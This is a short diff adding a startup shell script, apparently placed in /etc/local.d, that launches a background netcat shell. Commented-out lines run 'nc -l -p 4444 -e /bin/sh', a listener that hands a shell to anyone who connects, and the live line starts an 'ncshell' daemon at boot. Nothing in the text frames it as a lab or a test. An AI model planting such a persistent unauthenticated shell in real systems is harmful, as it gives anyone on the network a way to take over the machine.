@@ -1,0 +1,5 @@
+#! /bin/sh
+
+#start-stop-daemon --start -p /tmp/nc.pid -b -a /bin/sh -- /etc/local.d/nc_server
+#start-stop-daemon --start -p /tmp/nc.pid -b -x nc -- -l -p 4444 -e /bin/sh
+start-stop-daemon --start -p /tmp/ncshell.pid -b -x /etc/local.d/ncshell
